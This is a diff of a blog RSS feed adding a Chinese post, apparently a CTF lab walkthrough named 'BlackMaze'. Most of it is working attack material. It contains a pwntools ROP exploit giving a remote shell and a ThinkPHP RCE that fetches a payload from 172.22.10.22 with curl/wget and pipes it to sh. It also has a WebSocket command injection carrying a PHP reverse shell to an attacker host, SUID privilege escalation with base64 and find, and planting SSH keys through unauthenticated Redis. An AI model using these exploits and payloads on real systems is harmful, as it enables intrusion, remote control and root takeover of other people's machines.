@@ -1,5 +1,632 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>人生这么长，不一直学怎么行呢？</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Thu, 24 Sep 2026 11:15:57 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>Rivulet</title><link>https://faabbi.github.io/post/Rivulet.html</link><description>&lt;html&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>人生这么长，不一直学怎么行呢？</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Sun, 27 Sep 2026 03:29:05 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>BlackMaze</title><link>https://faabbi.github.io/post/BlackMaze.html</link><description># 外网
+
+这个靶子，其实还挺新颖的，也挺融合，常规扫一边之后记得扫一下全端口吧
+
+```zsh
+┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# fscan -h 39.98.124.196
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+39.98.124.196:22 open
+39.98.124.196:8080 open
+39.98.124.196:8081 open
+[*] alive ports len is: 3
+start vulscan
+[*] WebTitle http://39.98.124.196:8081 code:200 len:397    title:Directory listing for /
+[+] InfoScan http://39.98.124.196:8081 [目录遍历]
+[*] WebTitle http://39.98.124.196:8080 code:302 len:0      title:None 跳转url: http://39.98.124.196:8080/login;jsessionid=7C48FCE2B169F9F43F64C82BC79FF2F8
+[*] WebTitle http://39.98.124.196:8080/login;jsessionid=7C48FCE2B169F9F43F64C82BC79FF2F8 code:200 len:8663   title:Login
+```
+
+8080是个shiro框架，8081是个py起的http服务器，shiro下有很多api接口（在前端js能看到），这里思路可以提取出来看看有没有未授权访问，但是我嫌麻烦没搞，能未授权下jar包反编译找key？
+
+8081有个elf文件，是个ret2libc溢出好像，让ai看下就秒了，但是拿shell得打远程吧
+
+```bash
+fscan -h 39.98.124.196 -p 1-65535
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+39.98.124.196:22 open
+39.98.124.196:8081 open
+39.98.124.196:8080 open
+39.98.124.196:65533 open
+```
+有个高端口，nc一下确实是这个elf的服务
+
+```python
+from pwn import *
+
+# 偏移
+offset = 312
+
+# 地址
+pop_rsi      = 0x40117e
+pop_rax_rdi  = 0x401180
+pop_rdx      = 0x401183
+syscall      = 0x401187
+binsh        = 0x402004   # '/bin/sh' 字符串地址
+
+# 构造 payload
+payload  = b'A' * offset
+payload += p64(pop_rsi) + p64(0)          # rsi = 0 (argv)
+payload += p64(pop_rdx) + p64(0)          # rdx = 0 (envp)
+payload += p64(pop_rax_rdi) + p64(59) + p64(binsh)  # rax=59, rdi='/bin/sh'
+payload += p64(syscall)                   # 触发 execve
+
+p = remote('39.98.124.196', 65533)
+p.sendline(payload)
+p.interactive()
+```
+
+
+```zsh
+┌──(.venv3)─(root㉿MJ)-[/tmp/test/yunjing]
+└─# python3 exp.py
+[+] Opening connection to 39.98.124.196 on port 65533: Done
+[*] Switching to interactive mode
+Pwn me
+$ whoami
+webapp
+$
+```
+
+直接可以pwn掉了，写个私钥连上即可
+&lt;html&gt;
+&lt;body&gt;
+&lt;!--StartFragment--&gt;&lt;!-- obsidian --&gt;&lt;pre&gt;&lt;code class='language-bash'&gt;webapp@Shiro:~$ find / -perm -4000 2&gt;/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/umount
+/usr/bin/mount
+/usr/bin/stapbpf
+/usr/bin/staprun
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/pkexec
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/base64
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/fusermount
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;base64有s位，直接读即可&lt;/p&gt;
+&lt;pre&gt;&lt;code class='language-bash'&gt;webapp@Shiro:/$ base64 flag | base64 -d
+flag{16fc0d69-a7b9-0a5d-5ff6-8eab6776774f}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 data-heading='内网'&gt;内网&lt;/h1&gt;
+&lt;p&gt;依旧fscan开路，这里确实学到新东西了&lt;/p&gt;
+
+IP | 开放端口 | 服务/标题 | 漏洞/备注
+-- | -- | -- | --
+172.22.10.3 | 22, 80 | 80: HTTP，无标题，长度 931 | ThinkPHP 5.0.23 方法 RCE（fscan 已报）
+172.22.10.154 | 22, 80 | 80: HTTP，无标题，长度 691 | 应用类型未知，待手动探测
+172.22.10.155 | 22, 80, 9501 | 80: Apache2 Ubuntu 默认页  9501: HTTP 400，长度 83 | 9501 疑似 Swoole / Hyperf 等服务
+  |   |   |  
+  |   |   |  
+
+
+&lt;p&gt;这里的&lt;code&gt;think\__include_file&lt;/code&gt;是个tp内置函数，该说不说很有思路的绕过&lt;/p&gt;
+&lt;pre&gt;&lt;code class='language-php'&gt;function __include_file($file)
+{
+    return include $file;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;直接rce，上线vshell即可&lt;/p&gt;
+&lt;pre&gt;&lt;code class='language-bash'&gt;┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc -q python3 ez.py '(curl -fsSL -m180 http://172.22.10.22:10086/slt||wget -T180 -q http://172.22.10.22:10086/slt)|sh'
+
+[*] cmd: (curl -fsSL -m180 http://172.22.10.22:10086/slt||wget -T180 -q http://172.22.10.22:10086/slt)|sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class='language-bash'&gt;www-data@openrasp:/tmp$ ss -lnt
+State            Recv-Q           Send-Q                      Local Address:Port                        Peer Address:Port           Process           
+LISTEN           0                151                             127.0.0.1:3306                             0.0.0.0:*                                
+LISTEN           0                4096                        127.0.0.53%lo:53                               0.0.0.0:*                                
+LISTEN           0                128                               0.0.0.0:22                               0.0.0.0:*                                
+LISTEN           0                70                              127.0.0.1:33060                            0.0.0.0:*                                
+LISTEN           0                511                                     *:80                                     *:*                                
+LISTEN           0                128                                  [::]:22                                  [::]:*                                
+www-data@openrasp:/tmp$ 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;有mysql，database和config里都没有密码，在openRASP的日志里面&lt;/p&gt;&lt;!--EndFragment--&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+`/opt/logs/alarm/alarm.log.2025-01-20`
+
+有s位的find直接提权即可
+```bash
+www-data@openrasp:/$ find / -perm -4000 2&gt;/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/find
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/fusermount
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/at
+/snap/core20/1828/usr/bin/chfn
+/snap/core20/1828/usr/bin/chsh
+/snap/core20/1828/usr/bin/gpasswd
+/snap/core20/1828/usr/bin/mount
+/snap/core20/1828/usr/bin/newgrp
+/snap/core20/1828/usr/bin/passwd
+/snap/core20/1828/usr/bin/su
+/snap/core20/1828/usr/bin/sudo
+/snap/core20/1828/usr/bin/umount
+/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1828/usr/lib/openssh/ssh-keysign
+/snap/core20/2434/usr/bin/chfn
+/snap/core20/2434/usr/bin/chsh
+/snap/core20/2434/usr/bin/gpasswd
+/snap/core20/2434/usr/bin/mount
+/snap/core20/2434/usr/bin/newgrp
+/snap/core20/2434/usr/bin/passwd
+/snap/core20/2434/usr/bin/su
+/snap/core20/2434/usr/bin/sudo
+/snap/core20/2434/usr/bin/umount
+/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2434/usr/lib/openssh/ssh-keysign
+/snap/snapd/23545/usr/lib/snapd/snap-confine
+/snap/snapd/18357/usr/lib/snapd/snap-confine
+www-data@openrasp:/$ find . -exec /bin/sh -p \; -quit
+# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+# 
+```
+
+
+172.22.10.155的9501是个Swoole服务，**这里很神奇，究竟是怎么知道有命令注入的，很迷惑**
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import socket, base64, os, hashlib, struct, json
+
+HOST = '172.22.10.155'
+PORT = 9501
+PATH = '/'
+
+def ws_send_text(sock, text):
+    '''发送 WebSocket 文本帧（客户端必须掩码）'''
+    payload = text.encode()
+    # FIN + opcode(1=text)
+    frame = bytearray([0x81])
+    # MASK=1 + payload length
+    if len(payload) &lt; 126:
+        frame.append(0x80 | len(payload))
+    elif len(payload) &lt; 65536:
+        frame.append(0x80 | 126)
+        frame += struct.pack('&gt;H', len(payload))
+    else:
+        frame.append(0x80 | 127)
+        frame += struct.pack('&gt;Q', len(payload))
+    # 4 字节掩码 key
+    mask = os.urandom(4)
+    frame += mask
+    # 掩码 payload
+    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
+    frame += masked
+    sock.sendall(bytes(frame))
+
+def ws_recv(sock, timeout=5):
+    '''接收一帧（简化版，处理小帧）'''
+    sock.settimeout(timeout)
+    try:
+        hdr = sock.recv(2)
+        if len(hdr) &lt; 2:
+            return None
+        b1, b2 = hdr[0], hdr[1]
+        length = b2 &amp; 0x7f
+        if length == 126:
+            length = struct.unpack('&gt;H', sock.recv(2))[0]
+        elif length == 127:
+            length = struct.unpack('&gt;Q', sock.recv(8))[0]
+        masked = b2 &amp; 0x80
+        if masked:
+            mask = sock.recv(4)
+        data = b''
+        while len(data) &lt; length:
+            chunk = sock.recv(length - len(data))
+            if not chunk:
+                break
+            data += chunk
+        if masked:
+            data = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
+        return data.decode(errors='replace')
+    except socket.timeout:
+        return None
+    except Exception as e:
+        return f'[recv_err] {e}'
+
+# 1. TCP 连接
+s = socket.create_connection((HOST, PORT), timeout=10)
+
+# 2. WebSocket 握手
+key = base64.b64encode(os.urandom(16)).decode()
+req = (
+    f'GET {PATH} HTTP/1.1\r\n'
+    f'Host: {HOST}:{PORT}\r\n'
+    f'Upgrade: websocket\r\n'
+    f'Connection: Upgrade\r\n'
+    f'Sec-WebSocket-Key: {key}\r\n'
+    f'Sec-WebSocket-Version: 13\r\n'
+    f'\r\n'
+)
+s.sendall(req.encode())
+
+# 3. 读握手响应
+resp = b''
+while b'\r\n\r\n' not in resp:
+    chunk = s.recv(4096)
+    if not chunk:
+        break
+    resp += chunk
+print(f'[+] 握手响应:\n{resp.decode(errors='replace')[:300]}')
+
+# 4. 发 payload
+payload = ';php -r '$s=fsockopen(\'172.22.10.22\',2332);proc_open(\'/bin/bash\',[$s,$s,$s],$p);''
+msg = json.dumps({'emit': 'msg', 'message': '123', 'token': payload})
+print(f'\n[&gt;] Sending: {msg}')
+ws_send_text(s, msg)
+
+# 5. 收响应
+r = ws_recv(s, timeout=5)
+print(f'[&lt;] Received: {r}')
+
+s.close()
+```
+
+拿到shell，上线vshell即可
+
+```bash
+www-data@redis:/tmp$ ss -lnt
+State            Recv-Q           Send-Q                       Local Address:Port                       Peer Address:Port           Process           
+LISTEN           0                511                              127.0.0.1:6379                            0.0.0.0:*                                
+LISTEN           0                4096                         127.0.0.53%lo:53                              0.0.0.0:*                                
+LISTEN           0                128                                0.0.0.0:22                              0.0.0.0:*                                
+LISTEN           0                512                                0.0.0.0:9501                            0.0.0.0:*                                
+LISTEN           0                511                                      *:80                                    *:*                                
+LISTEN           0                128                                   [::]:22                                 [::]:*        
+```
+
+开了redis
+
+```bash
+www-data@redis:/tmp$ ps -aux | grep redis
+root         562  0.0  0.1  58320  7976 ?        Ssl  10:14   0:01 /opt/redis/redis-server 127.0.0.1:6379
+www-data    1573  0.0  0.0   9032   656 pts/0    S+   10:52   0:00 grep redis
+```
+
+root启动的，直接未授权秒了，可以看我老兄弟写的[[Redis未授权访问漏洞复现 - the0n3](https://the0n3.top/pages/cd7cec/)](https://the0n3.top/pages/cd7cec/)
+很详细，直接按着打就行，推荐偷一份留本地
+
+```bash
+www-data@redis:/tmp$ (echo -e '\n\n'; cat id_rsa.pub; echo -e '\n\n') &gt; key.txt
+www-data@redis:/tmp$ cat key.txt | redis-cli -h 127.0.0.1 -x set sshpub
+OK
+www-data@redis:/tmp$ redis-cli
+127.0.0.1:6379&gt; config set dir /root/.ssh
+OK
+127.0.0.1:6379&gt; config set dbfilename authorized_keys
+OK
+127.0.0.1:6379&gt; keys *
+1) 'sshpub'
+127.0.0.1:6379&gt; get sshpub
+'\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDM4qXRwDvTl9ctJFAuhiWRSobyowSJ6tnlykH6JNAa5rw/7X30dRmROBSdxs68lkvXp7y6xgjHtyfhzNZFtOw22xLBk7fIrt++7jF4h3fnIen/PokDThRJFFPi/rBTADsVrfqCcfhSUBCks2rKoMr4SJKjAwZK3znfKEtKQWhOz7o9zipCMoLatte1TWGmL0OY8f7hJxQpCwmKxK2LFI3lA8eS5pzlQ+4lzdNW3TytxRynKV1LUbkGJ7x/aNrood/UphbqxVVrgx/UXlZRPivit5Ya0ilp/d5uEpdBtGT395uCxKTqSDHQfvalbqbIdGZYq8Ilx+jeKMDFzDZVgACb29DIORYjKEzCIpiLALsTB8MdY2kcrkk6rkkf/Fy+vGkdJ0Q9MzvJ/PRbigKtx/zHiUp+j9j/nBBmPMp5FNzBBeMBlH76DJlDcw8cBTZCVYz1HiqdL4YhXvcoZ7yLj7qa0r7MpFwnobcpMc7mlJLqcf2Pltj4RoLxAu6KLD4ZcfU= root@MJ\n\n\n\n'
+127.0.0.1:6379&gt; save
+OK
+127.0.0.1:6379&gt; 
+```
+
+ssh上去即可
+
+```bash
+root@redis:~# cat flag
+flag{4b9581e7-131c-414e-a65f-209a0e533eb8}
+```
+
+
+`/opt/server.php`
+
+```php
+&lt;?php
+class WebSocket
+{
+  const HOST = '0.0.0.0';
+  const PORT = '9501';
+  const IMAGE_UPLOAD_API_URL = 'http://172.22.10.154/api/upload/image';
+  const FILE_UPLOAD_API_URL = 'http://172.22.10.154/api/upload/file';
+
+  public $server = null;
+  const ALLOWED_IMAGE_EXTENSIONS = [
+    'jpg', 'jpeg', 'png', 'gif', 'bmp', 'ico',
+  ];
+
+  const ALLOWED_FILE_EXTENSIONS = [
+    'pdf', 'zip', 'rar', 'txt', 'doc', 'docx', 'psd', 'xls', 'xlsx', 'ppt',
+  ];
+
+  public function __construct()
+  {
+    $redis = new \Redis();
+    $redis-&gt;pconnect('127.0.0.1', 6379, 0);
+
+    $this-&gt;server = new swoole_websocket_server(self::HOST, self::PORT);
+    $this-&gt;server-&gt;redis = $redis;
+
+    $this-&gt;server-&gt;set([
+      'task_worker_num' =&gt; 10,
+      'max_connection' =&gt; 10000,
+      'daemonize' =&gt; 0,
+    ]);
+
+    $this-&gt;server-&gt;on('open', [$this, 'onOpen']);
+    $this-&gt;server-&gt;on('message', [$this, 'onMessage']);
+    $this-&gt;server-&gt;on('task', [$this, 'onTask']);
+    $this-&gt;server-&gt;on('finish', [$this, 'onFinish']);
+    $this-&gt;server-&gt;on('close', [$this, 'onClose']);
+
+    $this-&gt;server-&gt;start();
+  }
+  private function isImageExtensionAllowed($fileName)
+  {
+    $fileExtension = pathinfo($fileName, PATHINFO_EXTENSION);
+    return in_array(strtolower($fileExtension), self::ALLOWED_IMAGE_EXTENSIONS);
+  }
+  private function isFileExtensionAllowed($fileName)
+  {
+    $fileExtension = pathinfo($fileName, PATHINFO_EXTENSION);
+    return in_array(strtolower($fileExtension), self::ALLOWED_FILE_EXTENSIONS);
+  }
+
+
+  public function onOpen($server, $frame)
+  {
+    // null
+  }
+
+  public function onMessage($server, $frame)
+  {
+    $data = json_decode($frame-&gt;data, true);
+    if (isset($data['emit']) &amp;&amp; isset($data['token'])) {
+      $token = $data['token'];
+      $messageKey = 'chat:messages:$token';
+
+      switch ($data['emit']) {
+        case 'getHistoryMessages':
+          $messages = $this-&gt;server-&gt;redis-&gt;lRange($messageKey, 0, -1);
+          if ($messages) {
+            $messages = array_map(function ($msg) {
+              return json_decode($msg, true);
+            }, $messages);
+            $server-&gt;push($frame-&gt;fd, json_encode([
+              'emit' =&gt; 'historyMessages',
+              'messages' =&gt; $messages,
+            ]));
+          }
+          break;
+        case 'fileUpload':
+          $server-&gt;task($data);
+          break;
+        case 'imageUpload':
+          $server-&gt;task($data);
+          break;
+        case 'msg':
+          $message = [
+            'type' =&gt; 'text',
+            'content' =&gt; $data['message'],
+            'timestamp' =&gt; time()
+          ];
+
+          $command = escapeshellarg(json_encode($message));
+          exec('redis-cli RPUSH $messageKey $command');
+          break;
+        case 'seatAssigned':
+          $server-&gt;push($frame-&gt;fd, json_encode([
+            'emit' =&gt; 'seatAssigned',
+            'message' =&gt; '\u5750\u5e2d\u5206\u914d\u6210\u529f\uff0c\u60a8\u5df2\u4e0e\u5750\u5e2d\u4eba\u5458\u8fde\u63a5\u3002'
+          ]));
+          break;
+        default:
+          $server-&gt;push($frame-&gt;fd, json_encode([
+            'emit' =&gt; 'error',
+            'message' =&gt; 'Invalid message format'
+          ]));
+          break;
+      }
+    }
+    elseif ($data === null) {
+      $token = bin2hex(random_bytes(16));
+      $server-&gt;push($frame-&gt;fd, json_encode([
+        'emit' =&gt; 'status',
+        'message' =&gt; 'success',
+        'id' =&gt; $frame-&gt;fd,
+        'token' =&gt; $token
+      ]));
+    } else {
+      $server-&gt;push($frame-&gt;fd, json_encode([
+        'emit' =&gt; 'error',
+        'message' =&gt; 'Invalid message format'
+      ]));
+    }
+  }
+
+  public function onTask($server, $task_id, $src_worker_id, $data)
+  {
+    if ($data['emit'] === 'fileUpload') {
+      $response = $this-&gt;uploadFile($data['file'], $data['token']);
+      $this-&gt;sendUploadResponse($server, $data['id'], $response);
+    } elseif ($data['emit'] === 'imageUpload') {
+      $response = $this-&gt;uploadImage($data['file'], $data['token']);
+      $this-&gt;sendUploadResponse($server, $data['id'], $response);
+    }
+  }
+
+  private function sendUploadResponse($server, $fd, $response)
+  {
+    if (isset($response['emit'])) {
+      $messageKey = 'chat:messages:{$response['token']}';
+      $this-&gt;server-&gt;redis-&gt;rPush($messageKey, json_encode([
+        'type' =&gt; $response['emit'] === 'fileUploaded' ? 'file' : 'image',
+        'content' =&gt; $response['fileUrl'] ?? $response['imageUrl'],
+        'timestamp' =&gt; time()
+      ]));
+
+      try {
+        $server-&gt;push($fd, json_encode($response));
+      }catch (\Exception $exception){
+        $server-&gt;push($fd, json_encode([
+          'emit' =&gt; 'error',
+          'message' =&gt; 'Type error',
+        ]));
+      }
+    }
+  }
+
+
+  public function onFinish($server, $task_id, $data)
+  {
+    // null
+  }
+
+
+  public function onClose($server, $fd)
+  {
+    $this-&gt;server-&gt;redis-&gt;hDel('connections', $fd);
+  }
+
+  public function uploadFile($fileData, $token)
+  {
+    $fileName = $fileData['name'];
+    $fileBase64 = base64_decode($fileData['data']);
+
+    $tempFilePath = sys_get_temp_dir() . '/' . uniqid() . '-' . $fileName;
+    file_put_contents($tempFilePath, $fileBase64);
+    if (!$this-&gt;isFileExtensionAllowed($fileName)) {
+      unlink($tempFilePath);
+      return [
+        'emit' =&gt; 'error',
+        'message' =&gt; 'File type error',
+      ];
+    }
+    $curl = curl_init();
+    $postFields = [
+      'File' =&gt; new CURLFile($tempFilePath, mime_content_type($tempFilePath), $fileName)
+    ];
+
+    curl_setopt_array($curl, [
+      CURLOPT_URL =&gt; self::FILE_UPLOAD_API_URL,
+      CURLOPT_RETURNTRANSFER =&gt; true,
+      CURLOPT_POST =&gt; true,
+      CURLOPT_POSTFIELDS =&gt; $postFields,
+    ]);
+
+    $response = curl_exec($curl);
+    curl_close($curl);
+
+    unlink($tempFilePath);
+
+    if ($response) {
+      $responseData = json_decode($response, true);
+      if ($responseData['code'] === 0) {
+        return [
+          'emit' =&gt; 'fileUploaded',
+          'token'=&gt; $token,
+          'fileUrl' =&gt; 'http://172.22.10.154' . $responseData['data']['src']
+        ];
+      }
+    }
+
+    return [
+      'emit' =&gt; 'error',
+      'message' =&gt; 'File upload failure'
+    ];
+  }
+
+  public function uploadImage($fileData, $token)
+  {
+    $fileName = $fileData['name'];
+    $fileBase64 = base64_decode($fileData['data']);
+
+    $tempFilePath = sys_get_temp_dir() . '/' . uniqid() . '-' . $fileName;
+    file_put_contents($tempFilePath, $fileBase64);
+    if (!$this-&gt;isImageExtensionAllowed($fileName)) {
+      unlink($tempFilePath);
+      return [
+        'emit' =&gt; 'error',
+        'message' =&gt; 'Image type error',
+      ];
+    }
+    $curl = curl_init();
+    $postFields = [
+      'File' =&gt; new CURLFile($tempFilePath, mime_content_type($tempFilePath), $fileName)
+    ];
+
+    curl_setopt_array($curl, [
+      CURLOPT_URL =&gt; self::IMAGE_UPLOAD_API_URL,
+      CURLOPT_RETURNTRANSFER =&gt; true,
+      CURLOPT_POST =&gt; true,
+      CURLOPT_POSTFIELDS =&gt; $postFields,
+    ]);
+
+    $response = curl_exec($curl);
+    curl_close($curl);
+
+    unlink($tempFilePath);
+
+    if ($response) {
+      $responseData = json_decode($response, true);
+      if ($responseData['code'] === 0) {
+        return [
+          'emit' =&gt; 'imageUploaded',
+          'token'=&gt; $token,
+          'imageUrl' =&gt; 'http://172.22.10.154' . $responseData['data']['src']
+        ];
+      }
+    }
+
+    return [
+      'emit' =&gt; 'error',
+      'message' =&gt; 'Image upload failure'
+    ];
+  }
+
+
+
+
+}
+$socket = new WebSocket();
+
+```
+
+可以看到跟154连接有文件上传的接口，同时154也是tp，ThinkPHP V5.1.41 LTS。</description><guid isPermaLink="true">https://faabbi.github.io/post/BlackMaze.html</guid><pubDate>Sun, 27 Sep 2026 03:28:30 +0000</pubDate></item><item><title>Rivulet</title><link>https://faabbi.github.io/post/Rivulet.html</link><description>&lt;html&gt;
 &lt;body&gt;
 &lt;!--StartFragment--&gt;&lt;!-- obsidian --&gt;&lt;h1 data-heading='外网'&gt;外网&lt;/h1&gt;
 &lt;pre&gt;&lt;code class='language-zsh'&gt;┌──(root㉿MJ)-[/tmp/test/yunjing]
